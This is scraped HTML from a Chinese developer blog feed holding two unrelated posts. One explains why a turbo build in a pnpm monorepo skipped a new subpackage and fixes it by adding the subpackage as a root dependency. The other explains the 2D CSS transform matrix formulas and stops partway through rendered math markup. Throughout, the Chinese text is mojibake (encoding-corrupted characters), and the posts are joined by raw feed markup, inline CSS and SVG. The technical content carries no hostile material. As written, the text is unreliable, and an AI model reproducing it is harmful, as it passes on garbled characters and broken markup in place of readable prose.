<p>åœ¨ pnpm + monorepo + turbo æ¶æ„ä¸­ï¼Œä»æ ¹åŒ…è¿è¡Œ turbo æ„å»ºå‘½ä»¤æ—¶ï¼Œturbo åªä¼šåŒ¹é…æ ¹åŒ…å·²å®‰è£…çš„å·¥ä½œåŒºå­åŒ…ã€‚å¦‚æœæ–°å¢çš„å­åŒ…ï¼ˆå¦‚ <code>@ruan-cat/claude-notifier</code>ï¼‰æœªè¢«æ ¹åŒ…ä¾èµ–ï¼Œåˆ™ä¼šè¢«æ„å»ºå‘½ä»¤é—æ¼ï¼Œå¯¼è‡´è¯¥å­åŒ…åŠå…¶æ–‡æ¡£éƒ½æ— æ³•æ„å»ºã€‚è§£å†³æ–¹æ¡ˆæ˜¯åœ¨æ ¹åŒ…çš„ <code>package.json</code> ä¸­æ˜¾å¼å®‰è£…æ‰€æœ‰éœ€è¦æ„å»ºçš„å­åŒ…ä¾èµ–ã€‚</p>
</blockquote>
<p>æˆ‘çš„é¡¹ç›®ç”¨äº† pnpm + monorepo + turbo çš„æ–¹æ¡ˆï¼Œæ¥å®ç°ä¸€æ½å­ node åŒ…çš„æ„å»ºä¸å‘å¸ƒã€‚å¯æ˜¯æˆ‘ä¹‹å‰çš„åŒ…éƒ½èƒ½åœ¨æµæ°´çº¿å†…æ„å»ºï¼Œä¸ºä»€ä¹ˆæœ€è¿‘æ–°å¼€å‘çš„ä¸€ä¸ªå­åŒ…å°±ä¸èƒ½åŠæ—¶æ„å»ºå‘¢ï¼Ÿæ€ä¹ˆä¼šæ¼ä¸œè¥¿å‘¢ï¼Ÿä¸ºä»€ä¹ˆ turbo ååå°±æ¼æ‰æˆ‘æ–°å¢åŠ çš„ <code>@ruan-cat/claude-notifier</code> å­åŒ…å‘¢ï¼Ÿ</p>
<h2 data-id="heading-0">é—®é¢˜æˆªå›¾</h2>
<p>å¦‚å›¾ï¼Œ<code>@ruan-cat/claude-notifier</code> ä¸ä»…ä»…æ²¡æœ‰å®Œæˆè‡ªèº«çš„æ„å»ºï¼Œä¹Ÿæ²¡æœ‰å®Œæˆæ–‡æ¡£æ„å»ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df6c082b4ecc460788c0014faebac6c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=ytSYn4CIQ9YIoX%2F0VgaTuT7TuYg%3D" alt="2025-10-28-01-53-01" loading="lazy"/></p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<p>é—® AI æ‰çŸ¥é“ï¼Œæˆ‘åœ¨ monorepo æ ¹åŒ…å†…è¿è¡Œ turbo æ„å»ºå‘½ä»¤ï¼Œå°±ç›¸å½“äºåŒ¹é…æ ¹åŒ…æ‰€ä¾èµ–å·¥ä½œåŒºå†…çš„å…¨éƒ¨å­åŒ…ã€‚å› ä¸ºæˆ‘æ ¹åŒ…å†…æ²¡æœ‰å®‰è£…ï¼Œæ²¡æœ‰å»ä¾èµ– <code>@ruan-cat/claude-notifier</code> è¿™ä¸ªæ–°çš„å­åŒ…ï¼Œæ‰€ä»¥æ— æ³•è¢«åŒ¹é…åˆ°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a50f0555c8a24e60bbf62eeaad734381~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=sTw0hUMbSoHOMWdWDMfABtx%2FCV4%3D" alt="2025-10-28-01-53-33" loading="lazy"/></p>
<h2 data-id="heading-2">é—®é¢˜è§£å†³</h2>
<p>å¬ AI çš„è¯ï¼Œå» monorepo æ ¹åŒ…å†…å®‰è£…é¡¹ç›®å†…çš„å­åŒ…ä¾èµ–ã€‚è™½ç„¶ä¼šè®©æ ¹åŒ…è†¨èƒ€ï¼Œä½†ä¹Ÿæ— æ‰€è°“ï¼Œå› ä¸ºæ ¹åŒ…åˆä¸å‘å¸ƒåˆ°é•œåƒæºï¼Œåˆ«äººä¹Ÿä¸çœ‹ã€‚</p>
<p>åç»­å·¥ä½œæµå°±èƒ½æ­£å¸¸è¿è¡Œäº†ï¼ŒæœŸæœ›çš„å­åŒ…å¦‚æœŸè¿è¡Œäº†æ–‡æ¡£æ„å»ºå‘½ä»¤ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ae68cd8f034a33bd532be065e2ec4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=UeypDLW%2BFM%2FnrS9BIuh938zSvbY%3D" alt="2025-10-28-01-54-34" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦è§£æ CSS transform çŸ©é˜µæ ¸å¿ƒå…¬å¼ï¼šx' = a*x + c*y + e ä¸ y' = b*x + d*y + f]]></title>    <link>https://juejin.cn/post/7594320543220170798</link>    <guid>https://juejin.cn/post/7594320543220170798</guid>    <pubDate>2026-01-13T00:06:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594320543220170798" data-draft-id="7592846242176729122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦è§£æ CSS transform çŸ©é˜µæ ¸å¿ƒå…¬å¼ï¼šx' = a*x + c*y + e ä¸ y' = b*x + d*y + f"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T00:06:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ycgg"/> <meta itemprop="url" content="https://juejin.cn/user/1926000101039192"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦è§£æ CSS transform çŸ©é˜µæ ¸å¿ƒå…¬å¼ï¼šx' = a*x + c*y + e ä¸ y' = b*x + d*y + f
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1926000101039192/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ycgg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T00:06:45.000Z" title="Tue Jan 13 2026 00:06:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ CSS <code>transform</code> çŸ©é˜µä½“ç³»ä¸­ï¼Œ<code>x' = a*x + c*y + e</code> å’Œ <code>y' = b*x + d*y + f</code> æ˜¯ 2D å›¾å½¢å˜æ¢çš„ã€Œåº•å±‚åæ ‡è®¡ç®—æ³•åˆ™ã€ã€‚æ‰€æœ‰é€šè¿‡ <code>matrix(a,b,c,d,e,f)</code> å®ç°çš„ç¼©æ”¾ã€æ—‹è½¬ã€å€¾æ–œã€å¹³ç§»ï¼Œæœ¬è´¨éƒ½æ˜¯é€šè¿‡è¿™ä¸¤ä¸ªå…¬å¼å°†å…ƒç´ çš„åŸå§‹åæ ‡ <code>(x, y)</code> æ˜ å°„ä¸ºå˜æ¢åçš„æ–°åæ ‡ <code>(x', y')</code>ã€‚ç†è§£è¿™ä¸¤ä¸ªå…¬å¼ï¼Œå°±èƒ½å½»åº•çœ‹é€çŸ©é˜µå‚æ•°çš„è”åŠ¨é€»è¾‘å’Œå˜æ¢æœ¬è´¨ã€‚</p>
<p>é¦–å…ˆæ˜ç¡®å…¬å¼ä¸­çš„æ ¸å¿ƒæ¦‚å¿µï¼š</p>
<ul>
<li><code>(x, y)</code>ï¼šå…ƒç´ ä¸Šä»»æ„ä¸€ç‚¹çš„ã€ŒåŸå§‹åæ ‡ã€ï¼Œä»¥å…ƒç´ çš„ã€Œå˜æ¢åŸç‚¹ã€ï¼ˆç”± <code>transform-origin</code> å®šä¹‰ï¼Œé»˜è®¤æ˜¯å…ƒç´ ä¸­å¿ƒ <code>50% 50%</code>ï¼‰ä¸ºåæ ‡ç³»åŸç‚¹ï¼Œæ°´å¹³å‘å³ä¸º X è½´æ­£æ–¹å‘ï¼Œå‚ç›´å‘ä¸‹ä¸º Y è½´æ­£æ–¹å‘ï¼›</li>
<li><code>(x', y')</code>ï¼šè¯¥ç‚¹ç»è¿‡çŸ©é˜µå˜æ¢åçš„ã€Œæ–°åæ ‡ã€ï¼Œåæ ‡ç³»åŸç‚¹ä¸åŸå§‹åæ ‡ä¿æŒä¸€è‡´ï¼Œæœ€ç»ˆå…ƒç´ çš„æ•´ä½“ä½ç½®ã€å½¢æ€ç”±æ‰€æœ‰ç‚¹çš„æ–°åæ ‡å…±åŒå†³å®šï¼›</li>
<li><code>aã€bã€cã€dã€eã€f</code>ï¼šå¯¹åº” <code>matrix</code> çŸ©é˜µçš„ 6 ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ§åˆ¶ä¸åŒç»´åº¦çš„å˜æ¢ï¼Œéƒ¨åˆ†å‚æ•°å­˜åœ¨è·¨è½´å…³è”ï¼ˆè¿™ä¹Ÿæ˜¯æ—‹è½¬ã€å€¾æ–œèƒ½å®ç°çš„å…³é”®ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-0">ä¸€ã€å…¬å¼æ‹†è§£ï¼šæ¯ä¸ªé¡¹çš„ä½œç”¨ä¸å‚æ•°é€»è¾‘</h2>
<p>ä¸¤ä¸ªå…¬å¼å¹¶éå­¤ç«‹ï¼Œè€Œæ˜¯é€šè¿‡è·¨è½´å‚æ•°ï¼ˆ<code>bã€c</code>ï¼‰å®ç°å¤æ‚å˜æ¢ï¼Œæˆ‘ä»¬é€å…¬å¼ã€é€é¡¹è§£æï¼Œç»“åˆå‚æ•°æœ¬è´¨è¯´æ˜å…¶å½±å“ã€‚</p>
<h3 data-id="heading-1">1. æ–° X åæ ‡å…¬å¼ï¼šx' = a<em>x + c</em>y + e</h3>
<p>è¯¥å…¬å¼å†³å®šäº†åŸå§‹ç‚¹ <code>(x, y)</code> å˜æ¢åçš„æ°´å¹³ä½ç½®ï¼Œç”±ã€ŒX è½´è‡ªèº«å…³è”é¡¹ã€ã€ŒY è½´è·¨è½´å…³è”é¡¹ã€ã€Œå¹³ç§»é¡¹ã€ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç¼ºä¸€ä¸å¯ã€‚</p>
<ul>
<li><strong>a*xï¼šX è½´è‡ªèº«ç¼©æ”¾/æ—‹è½¬å…³è”é¡¹</strong> <code>a</code> æ˜¯ X è½´çš„æ ¸å¿ƒæ§åˆ¶å‚æ•°ï¼Œç›´æ¥ä½œç”¨äºåŸå§‹ X åæ ‡ <code>x</code>ã€‚å½“ä»…ä¿®æ”¹ <code>a</code> æ—¶ï¼ˆå…¶ä»–å‚æ•°ä¸ºå•ä½çŸ©é˜µé»˜è®¤å€¼ï¼‰ï¼Œ<code>a</code> ä»£è¡¨ X è½´çš„ç¼©æ”¾ç³»æ•°ï¼š<code>a&gt;1</code> æ—¶ X è½´æ”¾å¤§ï¼Œ<code>0&lt;a&lt;1</code> æ—¶ X è½´ç¼©å°ï¼Œ<code>a=-1</code> æ—¶ X è½´åå‘ç¿»è½¬ã€‚ è€Œåœ¨æ—‹è½¬å˜æ¢ä¸­ï¼Œ<code>a</code> å¯¹åº” <code>cosÎ¸</code>ï¼ˆÎ¸ ä¸ºæ—‹è½¬è§’åº¦ï¼‰ï¼Œä¸ <code>bã€cã€d</code> è”åŠ¨ï¼Œé€šè¿‡ <code>a*x</code> è°ƒèŠ‚ X è½´æ–¹å‘çš„æ—‹è½¬åç§»ï¼Œç¡®ä¿æ—‹è½¬ååæ ‡çš„åˆç†æ€§ã€‚</li>
<li><strong>c*yï¼šY è½´å¯¹ X è½´çš„è·¨è½´å½±å“é¡¹ï¼ˆå€¾æ–œ/æ—‹è½¬å…³è”ï¼‰</strong> è¿™æ˜¯å…¬å¼çš„æ ¸å¿ƒéš¾ç‚¹ï¼Œä¹Ÿæ˜¯ã€Œéçº¯ç¼©æ”¾/å¹³ç§»å˜æ¢ã€çš„å…³é”®ã€‚<code>c</code> æœ¬è´¨æ˜¯ X è½´çš„å€¾æ–œç³»æ•°ï¼ŒåŒæ—¶å‚ä¸æ—‹è½¬è¿ç®—ï¼ˆå¯¹åº” <code>-sinÎ¸</code>ï¼‰ï¼Œå…¶ä½œç”¨æ˜¯è®© Y è½´çš„åæ ‡ <code>y</code> å¯¹ X è½´çš„æœ€ç»ˆä½ç½®äº§ç”Ÿå½±å“ã€‚ ä¸¾ä¾‹ï¼šå½“ <code>c=0.5</code>ï¼ˆå…¶ä»–å‚æ•°ä¸ºå•ä½çŸ©é˜µå€¼ï¼‰æ—¶ï¼ŒX è½´å‘ Y è½´å€¾æ–œï¼Œå€¾æ–œè§’åº¦ Ï† æ»¡è¶³ <code>tanÏ† = c</code>ï¼ˆå³çº¦ 26.565Â°ï¼‰ã€‚æ­¤æ—¶ï¼ŒåŸå§‹ç‚¹çš„ Y åæ ‡è¶Šå¤§ï¼ŒX è½´æ–¹å‘çš„åç§»é‡å°±è¶Šå¤§ï¼Œå‘ˆç°å‡ºâ€œå³ä¸‹å€¾æ–œâ€çš„æ•ˆæœï¼›è€Œåœ¨æ—‹è½¬æ—¶ï¼Œ<code>c*y</code> ä¸ <code>a*x</code> é…åˆï¼ŒæŠµæ¶ˆéƒ¨åˆ†åæ ‡åç§»ï¼Œç¡®ä¿æ—‹è½¬è½¨è¿¹ä¸ºæ­£åœ†ã€‚</li>
<li><strong>eï¼šX è½´ç»å¯¹å¹³ç§»é¡¹</strong> <code>e</code> æ˜¯ X è½´çš„å¹³ç§»å‚æ•°ï¼Œç›´æ¥å†³å®šå…ƒç´ åœ¨æ°´å¹³æ–¹å‘çš„æ•´ä½“åç§»é‡ï¼Œå•ä½ä¸ºåƒç´ æˆ–ç™¾åˆ†æ¯”ã€‚ä¸ <code>aã€c</code> ä¸åŒï¼Œ<code>e</code> æ˜¯ã€Œç‹¬ç«‹äºåŸå§‹åæ ‡ã€çš„å¸¸é‡ï¼Œä¸å—ç¼©æ”¾ã€æ—‹è½¬çš„å½±å“â€”â€”æ— è®ºåŸå§‹ç‚¹ <code>(x, y)</code> ä½ç½®å¦‚ä½•ï¼Œéƒ½ä¼šç»Ÿä¸€å åŠ  <code>e</code> çš„åç§»é‡ã€‚è¿™ä¹Ÿæ˜¯å¹³ç§»èƒ½é€šè¿‡çŸ©é˜µå®ç°çš„æ ¸å¿ƒï¼ˆé½æ¬¡çŸ©é˜µçš„ä½œç”¨å°±æ˜¯è®©å¹³ç§»å¯å‚ä¸çŸ©é˜µè¿ç®—ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">2. æ–° Y åæ ‡å…¬å¼ï¼šy' = b<em>x + d</em>y + f</h3>
<p>è¯¥å…¬å¼å†³å®šåŸå§‹ç‚¹ <code>(x, y)</code> å˜æ¢åçš„å‚ç›´ä½ç½®ï¼Œç»“æ„ä¸ X è½´å…¬å¼å¯¹ç§°ï¼ŒåŒæ ·åŒ…å«ã€ŒY è½´è‡ªèº«å…³è”é¡¹ã€ã€ŒX è½´è·¨è½´å…³è”é¡¹ã€ã€Œå¹³ç§»é¡¹ã€ä¸‰éƒ¨åˆ†ã€‚</p>
<ul>
<li><strong>b*xï¼šX è½´å¯¹ Y è½´çš„è·¨è½´å½±å“é¡¹ï¼ˆå€¾æ–œ/æ—‹è½¬å…³è”ï¼‰</strong> <code>b</code> ä¸ <code>c</code> å¯¹ç§°ï¼Œæ˜¯ Y è½´çš„å€¾æ–œç³»æ•°ï¼Œå‚ä¸æ—‹è½¬è¿ç®—æ—¶å¯¹åº” <code>sinÎ¸</code>ï¼Œä½œç”¨æ˜¯è®© X è½´çš„åæ ‡ <code>x</code> å¯¹ Y è½´çš„æœ€ç»ˆä½ç½®äº§ç”Ÿå½±å“ã€‚ ä¸¾ä¾‹ï¼šå½“ <code>b=0.5</code>ï¼ˆå…¶ä»–å‚æ•°ä¸ºå•ä½çŸ©é˜µå€¼ï¼‰æ—¶ï¼ŒY è½´å‘ X è½´å€¾æ–œï¼Œå€¾æ–œè§’åº¦ Ï† æ»¡è¶³ <code>tanÏ† = b</code>ã€‚åŸå§‹ç‚¹çš„ X åæ ‡è¶Šå¤§ï¼ŒY è½´æ–¹å‘çš„åç§»é‡å°±è¶Šå¤§ï¼Œå‘ˆç°å‡ºâ€œå·¦ä¸‹å€¾æ–œâ€çš„æ•ˆæœï¼›æ—‹è½¬æ—¶ï¼Œ<code>b*x</code> ä¸ <code>d*y</code> é…åˆï¼Œç¡®ä¿å‚ç›´æ–¹å‘çš„æ—‹è½¬åç§»å‡†ç¡®ã€‚</li>
<li><strong>d*yï¼šY è½´è‡ªèº«ç¼©æ”¾/æ—‹è½¬å…³è”é¡¹</strong> <code>d</code> æ˜¯ Y è½´çš„æ ¸å¿ƒæ§åˆ¶å‚æ•°ï¼Œä¸ <code>a</code> å¯¹ç§°ï¼Œç›´æ¥ä½œç”¨äºåŸå§‹ Y åæ ‡ <code>y</code>ã€‚ä»…ä¿®æ”¹ <code>d</code> æ—¶ï¼Œ<code>d</code> ä»£è¡¨ Y è½´çš„ç¼©æ”¾ç³»æ•°ï¼š<code>d&gt;1</code> æ—¶ Y è½´æ”¾å¤§ï¼Œ<code>0&lt;d&lt;1</code> æ—¶ Y è½´ç¼©å°ï¼Œ<code>d=-1</code> æ—¶ Y è½´åå‘ç¿»è½¬ã€‚æ—‹è½¬æ—¶ï¼Œ<code>d</code> å¯¹åº” <code>cosÎ¸</code>ï¼Œä¸ <code>a</code> ä¿æŒä¸€è‡´ï¼ˆç¡®ä¿æ—‹è½¬æ—¶å…ƒç´ ä¸è¢«æ‹‰ä¼¸å˜å½¢ï¼‰ã€‚</li>
<li><strong>fï¼šY è½´ç»å¯¹å¹³ç§»é¡¹</strong> <code>f</code> ä¸ <code>e</code> å¯¹ç§°ï¼Œæ˜¯ Y è½´çš„å¹³ç§»å‚æ•°ï¼Œå†³å®šå…ƒç´ åœ¨å‚ç›´æ–¹å‘çš„æ•´ä½“åç§»é‡ï¼ŒåŒæ ·æ˜¯ç‹¬ç«‹äºåŸå§‹åæ ‡çš„å¸¸é‡ï¼Œä¸å—ç¼©æ”¾ã€æ—‹è½¬å½±å“ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€å…³é”®è¡¥å……ï¼šè·¨è½´å…³è”çš„æœ¬è´¨ä¸çŸ©é˜µå¯¹åº”å…³ç³»</h2>
<p>å¾ˆå¤šäººç–‘æƒ‘ï¼šä¸ºä»€ä¹ˆ X è½´çš„æœ€ç»ˆä½ç½®ä¼šå— Y åæ ‡å½±å“ï¼ˆc<em>yï¼‰ï¼ŒY è½´ä½ç½®ä¼šå— X åæ ‡å½±å“ï¼ˆb</em>xï¼‰ï¼Ÿè¿™æœ¬è´¨æ˜¯çŸ©é˜µå¯¹ã€Œçº¿æ€§å˜æ¢ã€çš„å°è£…ï¼Œè€Œæ—‹è½¬ã€å€¾æ–œç­‰å˜æ¢æœ¬èº«å°±æ˜¯ã€Œè·¨è½´è”åŠ¨çš„ã€â€”â€”å•ç‹¬è°ƒæ•´æŸä¸€è½´çš„åæ ‡ï¼Œæ— æ³•å®ç°æ—‹è½¬æ•ˆæœã€‚</p>
<p>ç»“åˆå‰æ–‡æåˆ°çš„ 3Ã—3 é½æ¬¡çŸ©é˜µï¼Œè¿™ä¸¤ä¸ªå…¬å¼æ­£æ˜¯çŸ©é˜µä¹˜æ³•çš„å±•å¼€ç»“æœï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>e</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>f</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>Ã—</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix} x' \\ y' \\ 1 \end{bmatrix} = \begin{bmatrix} a &amp; c &amp; e \\ b &amp; d &amp; f \\ 0 &amp; 0 &amp; 1 \end{bmatrix} \times \begin{bmatrix} x \\ y \\ 1 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span 